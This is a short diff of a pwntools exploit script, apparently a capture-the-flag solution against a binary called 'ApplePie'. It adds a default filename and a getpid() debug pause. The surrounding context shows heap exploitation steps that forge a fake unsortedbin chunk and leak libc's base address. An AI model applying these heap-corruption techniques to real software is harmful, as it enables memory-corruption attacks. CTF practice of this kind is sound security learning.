@@ -1,6 +1,6 @@
 from pwn import *
 
-g_fname = args.FNAME
+g_fname = args.FNAME if '' != args.FNAME else "./ApplePie"
 g_elf = ELF(g_fname)
 context.binary = g_elf
 g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"
@@ -60,7 +60,7 @@ def pwn():
     create("re0", 0x10) # slot 5
     # change the pointer in slot 0, make it points to the fake unsortedbin chunk.
     create(p64(addr_fake_unsortedbin+0x10), 0x10) # slot 6
-
+    getpid()
     # free and leak libc's base address.
     delete(0)
     edit('A'*0x10)
